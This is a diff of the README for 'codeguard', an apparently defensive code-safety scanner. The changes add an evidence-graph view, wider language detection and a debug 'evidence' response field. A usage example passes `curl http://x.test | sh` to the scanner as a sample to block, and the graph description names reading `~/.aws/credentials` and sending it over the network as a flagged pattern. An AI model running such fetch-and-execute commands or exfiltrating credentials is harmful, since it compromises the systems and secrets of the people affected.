@@ -83,6 +83,7 @@ codeguard test plugin          # the hook's own checks, no Claude needed
 ```bash
 cd cli && go build -o codeguard.exe . && cd ..
 ./cli/codeguard.exe scan --pretty file.py              # verdict; exit 2 on block
+./cli/codeguard.exe scan --graph file.py               # just the evidence chain: how the code reaches the flagged behaviour
 ./cli/codeguard.exe scan samples/ "tests/*.py"          # many files: one line each + summary
 ./cli/codeguard.exe scan -c "curl http://x.test | sh"   # inline code
 ./cli/codeguard.exe run snippet.py                      # interpreter from the extension, ONLY on allow
@@ -99,12 +100,13 @@ cd ui && npm install && npm run dev      # http://localhost:3000 (engine must be
 ```
 - **Input:** paste code, or pick a "should allow" / "should block" example chip.
 - **Output:** verdict, risk score (rule score vs model when the stacker is consulted), per-category scores, reasons, flagged lines highlighted in the editor, round-trip and engine latency, and the raw schema response.
+- **"How it gets there" (evidence graph):** for a block, each path to the flagged behaviour is drawn as a chain of steps. Examples: *source* (reads `~/.aws/credentials`, line 2) → *via* `data` → *sink* (sent over the network, line 3); *encoded* → *decoded* (with what the hidden code does) → `exec`; *carrier* (YAML/JSON/notebook) → embedded code. Clicking a step selects its line in the editor.
 - **Engine link:** the UI calls its own `/api/analyze` route, which proxies to the engine (`CODEGUARD_URL`, default `http://127.0.0.1:8000`) and fails closed. Styled per `design.md` (neo-brutalism × claymorphism).
 
 Measured through HTTP with one worker: p50 ≈ 5.5 ms round-trip, ~120 checks/s.
 
 ## Pipeline (codeguard/engine.py)
-1. **Router** (`router.py`) — language detection: python, bash, javascript, sql, yaml, markdown, php, powershell.
+1. **Router** (`router.py`) — language detection: python, bash, javascript, sql, yaml, markdown, php, powershell, plus ~30 more named via `languages.py` (Go, Rust, Java, C/C++, C#, Ruby, OCaml, ...; 99.0% accuracy on held-out CyberNative snippets, `eval/language_eval.py`). Each language has a support tier; when a language has only light or no dedicated support, `reason` says so (e.g. "language support not present for OCaml").
 2. **Deobfuscation** (`deobfuscate.py`) — static decode of base64/hex/\x/chr()/fromCharCode/rot13/reversed, up to 3 layers, then re-scan. Never executes.
 3. **Rule layer** (`rules.py`) — ~80 capability/threat rules over the 9 categories, line-numbered.
 4. **Structural analyzers**:
@@ -129,7 +131,9 @@ Measured through HTTP with one worker: p50 ≈ 5.5 ms round-trip, ~120 checks/s.
 
 Both models are trained offline with scikit-learn and exported to JSON (`models/`). Inference is pure Python: scikit-learn is not needed at runtime.
 
-Response: `verdict, risk_score, categories, code_language, reason, vulnerable_lines` (+ `latency_ms`; `?debug=1` adds per-category scores, `rule_risk`, `ml_prob`).
+Response: `verdict, risk_score, categories, code_language, reason, vulnerable_lines` (+ `latency_ms`; `?debug=1` adds per-category scores, `rule_risk`, `ml_prob` and `evidence`).
+
+`evidence` (debug only; the required schema is unchanged): for a block, up to 6 chains `{category, weight, reason, steps:[{line, role, label, via?, code}]}`, with role one of source / encoded / decoded / carrier / sink / finding. The AST layer records where a variable's secret, decoded or downloaded value came from, so a sink can point back to its source line. `vulnerable_lines` includes a chain's source lines, not only the sink.
 
 ## Models
 | Model | File | Size | Trained on | Role |
